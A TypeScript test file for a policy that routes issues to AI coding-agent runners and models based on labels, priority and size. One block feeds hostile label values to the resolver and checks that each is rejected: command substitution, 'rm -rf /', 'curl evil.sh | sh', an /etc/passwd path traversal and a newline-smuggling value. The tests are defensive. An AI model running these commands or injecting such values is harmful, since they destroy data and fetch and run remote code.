// Selection + routing policy. Everything here is pure, and the label paths are the untrusted-input
// surface that feeds a spawn — the hostile cases are asserted to fall back, never to pass through.
import { describe, expect, test } from "bun:test";
import {
  type PolicyDefaults,
  type SelectableIssue,
  compareIssues,
  formatSessionPlan,
  hasAcceptanceCriteria,
  isEpicTitle,
  parseDeps,
  pickSessionModel,
  priorityRank,
  resolveSessionPolicy,
  sessionTier,
  sizeRank,
} from "./index.ts";

const mk = (over: Partial<SelectableIssue> = {}): SelectableIssue => ({
  number: 1,
  title: "feat(api): add a thing",
  labels: [],
  createdAt: "2026-01-01T00:00:00Z",
  priority: 2,
  size: 1,
  ...over,
});

const MODELS = { strong: "opus", cheap: "sonnet" };
const defaults = (over: Partial<PolicyDefaults> = {}): PolicyDefaults => ({
  implement: { runner: "claude", strongModel: "opus", cheapModel: "sonnet" },
  review: { runner: "claude", strongModel: "opus", cheapModel: "sonnet" },
  ...over,
});

describe("sessionTier / pickSessionModel", () => {
  test("P0/P1 always strong, regardless of size or shape", () => {
    expect(pickSessionModel(mk({ priority: 0, size: 0 }), MODELS)).toBe("opus");
    expect(pickSessionModel(mk({ priority: 1, size: 0, title: "docs: tiny" }), MODELS)).toBe(
      "opus",
    );
  });
  test("size M+ is strong, and unsized ranks as L", () => {
    expect(pickSessionModel(mk({ priority: 3, size: 2 }), MODELS)).toBe("opus");
    expect(pickSessionModel(mk({ priority: 3, size: 4 }), MODELS)).toBe("opus");
    expect(pickSessionModel(mk({ priority: 3, size: 3 }), MODELS)).toBe("opus");
  });
  test("XS anything is cheap", () => {
    expect(
      pickSessionModel(mk({ priority: 3, size: 0, title: "fix(api): tiny bug" }), MODELS),
    ).toBe("sonnet");
  });
  test("S mechanical work is cheap", () => {
    expect(
      pickSessionModel(mk({ priority: 3, size: 1, title: "docs: update crawl.mdx" }), MODELS),
    ).toBe("sonnet");
    expect(
      pickSessionModel(mk({ priority: 2, size: 1, title: "test(api): bump timeout" }), MODELS),
    ).toBe("sonnet");
    expect(
      pickSessionModel(mk({ priority: 3, size: 1, title: "chore(deps): tidy lockfiles" }), MODELS),
    ).toBe("sonnet");
    expect(
      pickSessionModel(
        mk({ priority: 3, size: 1, title: "update the guide", labels: ["documentation"] }),
        MODELS,
      ),
    ).toBe("sonnet");
  });
  test("S code changes stay strong", () => {
    expect(
      pickSessionModel(
        mk({ priority: 2, size: 1, title: "fix(cloud): overspend by one batch" }),
        MODELS,
      ),
    ).toBe("opus");
  });
  test("the mechanical match is prefix-anchored, not a substring", () => {
    expect(sessionTier(mk({ priority: 2, size: 1, title: "test harness rewrite for auth" }))).toBe(
      "cheap",
    );
    expect(sessionTier(mk({ priority: 2, size: 1, title: "retest auth flows" }))).toBe("strong");
  });
});

describe("resolveSessionPolicy — resolution order", () => {
  test("no labels → config runner + heuristic model", () => {
    const p = resolveSessionPolicy(mk({ priority: 0, size: 4 }), defaults());
    expect(p.implement).toMatchObject({ runner: "claude", model: "opus" });
    expect(p.implement.source).toMatchObject({ runner: "config", model: "heuristic" });
  });

  test("a config model beats the heuristic", () => {
    const p = resolveSessionPolicy(
      mk({ priority: 3, size: 0 }),
      defaults({
        implement: {
          runner: "claude",
          model: "claude-opus-5",
          strongModel: "opus",
          cheapModel: "sonnet",
        },
      }),
    );
    expect(p.implement.model).toBe("claude-opus-5");
    expect(p.implement.source.model).toBe("config");
  });

  test("a validated label beats both", () => {
    const p = resolveSessionPolicy(
      mk({
        priority: 0,
        size: 4,
        labels: ["loop:impl-model-sonnet", "loop:impl-effort-max", "loop:impl-runner-codex"],
      }),
      defaults(),
    );
    // runner resolves first, so the effort is validated against codex's vocabulary — "max" is claude-only.
    expect(p.implement.runner).toBe("codex");
    expect(p.implement.model).toBe("sonnet");
    expect(p.implement.effort).toBeUndefined();
  });

  // Caught on the first real run: `loop:impl-runner-codex` on an otherwise unlabelled issue resolved to
  // codex/sonnet, because the heuristic tier reads strong/cheap_model out of a config block written for
  // claude. validateModel is shape-only and cannot catch it, so `codex -m sonnet` would have died as a
  // generic implement failure.
  test("a label-switched runner discards config model defaults rather than forwarding claude ids", () => {
    const p = resolveSessionPolicy(
      mk({ priority: 3, size: 0, labels: ["loop:impl-runner-codex"] }),
      defaults({
        implement: {
          runner: "claude",
          model: "claude-opus-5",
          strongModel: "opus",
          cheapModel: "sonnet",
        },
      }),
    );
    expect(p.implement.runner).toBe("codex");
    expect(p.implement.model).toBeUndefined();
    expect(p.implement.source.model).toBe("runner-default");
  });

  test("an explicit model label still wins when the runner was switched by label", () => {
    const p = resolveSessionPolicy(
      mk({
        priority: 3,
        size: 0,
        labels: ["loop:impl-runner-codex", "loop:impl-model-gpt-5.6-sol"],
      }),
      defaults(),
    );
    expect(p.implement).toMatchObject({ runner: "codex", model: "gpt-5.6-sol" });
    expect(p.implement.source.model).toBe("label");
  });

  test("config models survive when the label names the runner already configured", () => {
    const p = resolveSessionPolicy(
      mk({ priority: 3, size: 0, labels: ["loop:impl-runner-claude"] }),
      defaults(),
    );
    expect(p.implement).toMatchObject({ runner: "claude", model: "sonnet" });
    expect(p.implement.source.model).toBe("heuristic");
  });

  test("the four axes are independent across roles", () => {
    const p = resolveSessionPolicy(
      mk({
        labels: [
          "loop:impl-runner-claude",
          "loop:impl-effort-high",
          "loop:review-runner-codex",
          "loop:review-model-gpt-5-codex",
          "loop:review-effort-medium",
        ],
      }),
      defaults(),
    );
    expect(p.implement).toMatchObject({ runner: "claude", effort: "high" });
    expect(p.review).toMatchObject({ runner: "codex", model: "gpt-5-codex", effort: "medium" });
  });

  test("loop:model-* still means the implement model, and never the review one", () => {
    const p = resolveSessionPolicy(
      mk({ priority: 0, size: 4, labels: ["loop:model-sonnet"] }),
      defaults(),
    );
    expect(p.implement.model).toBe("sonnet");
    expect(p.implement.source.model).toBe("label");
    expect(p.review.model).toBe("opus"); // heuristic, untouched by the legacy alias
  });

  test("an explicit loop:impl-model-* wins over the legacy alias", () => {
    const p = resolveSessionPolicy(
      mk({ labels: ["loop:model-sonnet", "loop:impl-model-haiku"] }),
      defaults(),
    );
    expect(p.implement.model).toBe("haiku");
  });

  test("full claude-* model ids pass; a slash-qualified id only passes for opencode", () => {
    expect(
      resolveSessionPolicy(mk({ labels: ["loop:impl-model-Claude-Opus-4-8"] }), defaults())
        .implement.model,
    ).toBe("claude-opus-4-8");
    expect(
      resolveSessionPolicy(
        mk({ labels: ["loop:impl-model-anthropic/claude-opus-4-8"] }),
        defaults(),
      ).implement.source.model,
    ).toBe("heuristic");
    expect(
      resolveSessionPolicy(
        mk({ labels: ["loop:impl-runner-opencode", "loop:impl-model-anthropic/claude-opus-4-8"] }),
        defaults(),
      ).implement.model,
    ).toBe("anthropic/claude-opus-4-8");
  });

  test("ambiguity (two conflicting labels on one axis) falls back rather than picking arbitrarily", () => {
    const p = resolveSessionPolicy(
      mk({ priority: 0, size: 4, labels: ["loop:impl-model-sonnet", "loop:impl-model-haiku"] }),
      defaults(),
    );
    expect(p.implement.model).toBe("opus");
    expect(p.implement.source.model).toBe("heuristic");
  });

  test("with no models configured at all the flag is simply omitted", () => {
    const p = resolveSessionPolicy(
      mk(),
      defaults({ implement: { runner: "claude" }, review: { runner: "claude" } }),
    );
    expect(p.implement.model).toBeUndefined();
    expect(p.implement.source.model).toBe("runner-default");
  });
});

describe("resolveSessionPolicy — hostile labels never reach the spawn", () => {
  const hostile = [
    "loop:impl-model-$(whoami)",
    "loop:impl-model-`id`",
    "loop:impl-model-opus; rm -rf /",
    'loop:impl-model-opus"; curl evil.sh | sh',
    "loop:impl-model-",
    "loop:impl-model-оpus", // cyrillic homoglyph
    "loop:impl-effort-high; id",
    "loop:impl-runner-claude; sh",
    "loop:impl-runner-gemini",
    "loop:review-model-../../etc/passwd",
  ];
  for (const label of hostile) {
    test(`${label} → silent fallback`, () => {
      const p = resolveSessionPolicy(mk({ priority: 3, size: 0, labels: [label] }), defaults());
      const values = [p.implement, p.review].flatMap((s) => [
        s.runner,
        s.model ?? "",
        s.effort ?? "",
      ]);
      expect(values.join(" ")).not.toContain("whoami");
      expect(values.join(" ")).not.toContain("rm -rf");
      expect(values.join(" ")).not.toContain(";");
      expect(p.implement.model).toBe("sonnet"); // heuristic (XS) took over
      expect(p.implement.runner).toBe("claude");
    });
  }

  test("a newline-bearing label can't smuggle a second value", () => {
    const p = resolveSessionPolicy(mk({ labels: ["loop:impl-model-opus\nsonnet"] }), defaults());
    expect(p.implement.source.model).not.toBe("label");
  });
});

describe("formatSessionPlan", () => {
  test("renders runner/model/effort plus a source fingerprint", () => {
    const p = resolveSessionPolicy(
      mk({ priority: 0, labels: ["loop:impl-effort-high"] }),
      defaults(),
    );
    expect(formatSessionPlan(p.implement)).toBe("claude/opus/high (chl)");
  });
});

describe("parseDeps", () => {
  test("none", () => expect(parseDeps("just a normal body")).toEqual([]));
  test("depends on single", () => expect(parseDeps("Depends on #42")).toEqual([42]));
  test("depends on list", () => expect(parseDeps("Depends on #1, #2 #3")).toEqual([1, 2, 3]));
  test("blocked by", () => expect(parseDeps("Blocked by #7")).toEqual([7]));
  test("dedupes across lines", () =>
    expect(parseDeps("Depends on #5\nblocked by #5, #6")).toEqual([5, 6]));
  test("ignores plain issue refs", () => expect(parseDeps("see #99 for context")).toEqual([]));
});

describe("compareIssues", () => {
  test("priority first", () => {
    expect(compareIssues(mk({ priority: 0 }), mk({ priority: 1 }))).toBeLessThan(0);
    expect(compareIssues(mk({ priority: 2 }), mk({ priority: 1 }))).toBeGreaterThan(0);
  });
  test("then size", () => {
    expect(compareIssues(mk({ priority: 1, size: 1 }), mk({ priority: 1, size: 3 }))).toBeLessThan(
      0,
    );
  });
  test("then age, oldest first", () => {
    const older = mk({ createdAt: "2026-01-01T00:00:00Z" });
    const newer = mk({ createdAt: "2026-02-01T00:00:00Z" });
    expect(compareIssues(older, newer)).toBeLessThan(0);
  });
  test("sorts a queue end to end", () => {
    const q = [
      mk({ number: 3, priority: 2, size: 0 }),
      mk({ number: 1, priority: 0, size: 4 }),
      mk({ number: 2, priority: 1, size: 1 }),
    ];
    expect(q.toSorted(compareIssues).map((i) => i.number)).toEqual([1, 2, 3]);
  });
});

describe("label ranks + issue contract", () => {
  test("priorityRank / sizeRank read the label vocabulary, unknown sorts late", () => {
    expect(priorityRank(["P1", "bug"])).toBe(1);
    expect(priorityRank(["bug"])).toBe(9);
    expect(sizeRank(["size: M"])).toBe(2);
    expect(sizeRank(["size:xs"])).toBe(0);
    expect(sizeRank(["bug"])).toBe(3);
  });
  test("acceptance criteria needs BOTH the heading and a checkbox", () => {
    expect(hasAcceptanceCriteria("## Acceptance Criteria\n- [ ] does the thing")).toBe(true);
    expect(hasAcceptanceCriteria("## Acceptance Criteria\njust prose")).toBe(false);
    expect(hasAcceptanceCriteria("- [ ] a checkbox with no heading")).toBe(false);
    expect(hasAcceptanceCriteria("### Done when\n- [x] shipped", "Done when")).toBe(true);
  });
  test("epic titles are containers", () => {
    expect(isEpicTitle("epic(billing): rework credits")).toBe(true);
    expect(isEpicTitle("epic: content marketing pages")).toBe(true);
    expect(isEpicTitle("Epic: multi-channel campaigns")).toBe(true);
    expect(isEpicTitle("fix(billing): epic bug")).toBe(false);
    expect(isEpicTitle("epics: a word that merely starts with epic")).toBe(false);
    expect(isEpicTitle("an epic: not at the start")).toBe(false);
  });
});
